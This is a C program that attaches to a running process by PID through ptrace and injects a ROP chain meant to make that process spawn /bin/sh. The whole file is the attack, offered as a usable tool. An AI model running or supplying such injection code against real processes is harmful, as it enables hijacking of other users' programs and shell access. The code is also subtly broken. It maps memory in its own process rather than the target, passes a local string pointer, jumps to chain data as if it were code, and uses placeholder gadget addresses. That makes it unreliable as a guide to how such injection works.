#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

// Gadgets for ROP chain (example addresses for a 32-bit binary)
#define GADGET_POP_EAX 0x080484b6
#define GADGET_POP_EBX 0x080484b7
#define GADGET_POP_ECX 0x080484b8
#define GADGET_POP_EDX 0x080484b9
#define GADGET_INT_80  0x080484ba

void inject_rop_chain(pid_t pid) {
    // Attach to the target process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace(ATTACH)");
        exit(1);
    }
    wait(NULL); // Wait for the process to stop

    // Create a ROP chain to execute execve("/bin/sh", NULL, NULL)
    long rop_chain[] = {
        GADGET_POP_EAX, 11,          // syscall number for execve
        GADGET_POP_EBX, (long)"/bin/sh", // path to /bin/sh
        GADGET_POP_ECX, 0,           // argv
        GADGET_POP_EDX, 0,           // envp
        GADGET_INT_80                // interrupt to invoke syscall
    };

    // Allocate memory in the target process for the ROP chain
    void *remote_mem = mmap(NULL, sizeof(rop_chain), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (remote_mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // Write the ROP chain to the target process
    for (size_t i = 0; i < sizeof(rop_chain) / sizeof(rop_chain[0]); i++) {
        if (ptrace(PTRACE_POKETEXT, pid, remote_mem + i * sizeof(long), rop_chain[i]) < 0) {
            perror("ptrace(POKETEXT)");
            exit(1);
        }
    }

    // Set the instruction pointer to the ROP chain
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(GETREGS)");
        exit(1);
    }
    regs.eip = (long)remote_mem; // Set EIP to the ROP chain
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        exit(1);
    }

    // Continue the process to execute the ROP chain
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("ptrace(CONT)");
        exit(1);
    }

    // Detach from the target process
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        perror("ptrace(DETACH)");
        exit(1);
    }

    printf("ROP chain injected and executed in process %d\n", pid);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]); // Target process ID
    inject_rop_chain(pid);

    return 0;
}
